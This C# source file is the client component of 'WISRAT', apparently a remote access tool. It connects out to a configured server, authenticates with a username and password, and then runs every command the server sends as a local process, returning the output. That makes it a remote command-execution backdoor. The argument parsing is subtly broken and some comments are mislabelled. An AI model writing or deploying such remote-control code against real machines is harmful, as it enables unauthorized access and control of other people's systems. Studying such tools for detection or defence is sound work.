using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using Serilog.Core;
using WISRAT.Shared;

namespace WISRAT.Client
{
    /// <summary>
    /// WISRAT Client
    /// </summary>
    public class Client : IDisposable
    {
        /// <summary>
        /// Server port
        /// </summary>
        private int _port;
        
        /// <summary>
        /// Server port
        /// </summary>
        private IPAddress _ip;
        
        /// <summary>
        /// Server password
        /// </summary>
        private string _password;

        /// <summary>
        /// TcpListener instance
        /// </summary>
        private readonly TcpClient _client;

        /// <summary>
        /// Do we use Serilog logger
        /// </summary>
        private readonly bool _useLogger = false;

        /// <summary>
        /// Serilog logger
        /// </summary>
        private readonly Logger _logger;

        /// <summary>
        /// Is client shutting down?
        /// </summary>
        private bool _isShuttingDown = false;

        /// <summary>
        /// Makes an instance of Server
        /// </summary>
        /// <param name="ip">IP</param>
        /// <param name="port">Port</param>
        /// <param name="username">Username</param>
        /// <param name="password">Password</param>
        public Client(IPAddress ip, int port, string username, string password)
        {
            _ip = ip;
            _port = port;
            _password = password;
            _useLogger = false;
            _client = new TcpClient();
            _client.Connect(ip, port);
            SendMessage(new MessageBuilder.Message { Type = MessageBuilder.MessageType.UserData, 
                Content = Encoding.UTF8.GetBytes($"{username}|{password}") });
            new Thread(ReceiverThread).Start();
        }

        /// <summary>
        /// Makes an instance of Server with Serilog logger
        /// </summary>
        /// <param name="ip">IP</param>
        /// <param name="port">Port</param>
        /// <param name="username">Username</param>
        /// <param name="password">Password</param>
        /// <param name="logger">Logger (optional)</param>
        public Client(IPAddress ip, int port, string username, string password, Logger logger)
        {
            _ip = ip;
            _port = port;
            _password = password;
            _useLogger = true;
            _logger = logger;
            _client = new TcpClient();
            _client.Connect(ip, port);
            SendMessage(new MessageBuilder.Message { Type = MessageBuilder.MessageType.UserData, 
                Content = Encoding.UTF8.GetBytes($"{username}|{password}") });
            new Thread(ReceiverThread).Start();
        }

        /// <summary>
        /// Sends message to client
        /// </summary>
        private void SendMessage(MessageBuilder.Message message)
        {
            NetworkSender sender = new NetworkSender(_client.GetStream());
            sender.SendMessage(message);
        }

        /// <summary>
        /// Processes client messages
        /// </summary>
        private void ReceiverThread()
        {
            if (_useLogger) _logger.Information("[Receiver] Thread started!");
            while (true)
            {
                if (_isShuttingDown) return;
                NetworkSender sender = new NetworkSender(_client.GetStream());
                MessageBuilder.Message msg = sender.ReadMessage();
                if (_isShuttingDown) return;

                switch (msg.Type)
                {
                    case MessageBuilder.MessageType.Disconnect:
                        if (_useLogger) _logger.Warning($"[Receiver] Unexpected packet Disconnect (from server)!");
                        break;
                    case MessageBuilder.MessageType.CommandOutput:
                        if (_useLogger) _logger.Warning($"[Receiver] Unexpected packet CommandOutput (from server)!");
                        break;
                    case MessageBuilder.MessageType.ExecuteCommand:
                        string cmd = Encoding.UTF8.GetString(msg.Content);
                        if (_useLogger) _logger.Information($"[Receiver] Executing command:");
                        if (_useLogger) _logger.Information(cmd);
                        new Thread(() => {
                            Process p = new Process();
                            p.StartInfo.RedirectStandardOutput = true;
                            p.StartInfo.FileName = cmd.Split(' ')[0];
                            p.StartInfo.Arguments = cmd.Substring(cmd.Split(' ')[0].Length, cmd.Length);
                            p.Start();
                            p.WaitForExit();
                            string output = p.StandardOutput.ReadToEnd();
                            SendMessage(new MessageBuilder.Message { Type = MessageBuilder.MessageType.CommandOutput, 
                                Content = Encoding.UTF8.GetBytes(output) });
                            if (_useLogger) _logger.Information($"[Command] Standard output sent!");
                        }).Start();
                        break;
                    case MessageBuilder.MessageType.UserData:
                        if (_useLogger) _logger.Warning($"[Receiver] Unexpected packet UserData (from server)!");
                        break;
                }
            }
        }

        /// <summary>
        /// Disposes TcpClient and stops all threads
        /// </summary>
        public void Dispose()
        {
            if (_useLogger) _logger.Information("Disposing server...");
            _isShuttingDown = true;
            SendMessage(new MessageBuilder.Message { Type = MessageBuilder.MessageType.Disconnect, 
                Content = Array.Empty<byte>() });
            _client.Dispose();
            if (_useLogger) _logger.Information("Done!");
        }
    }
}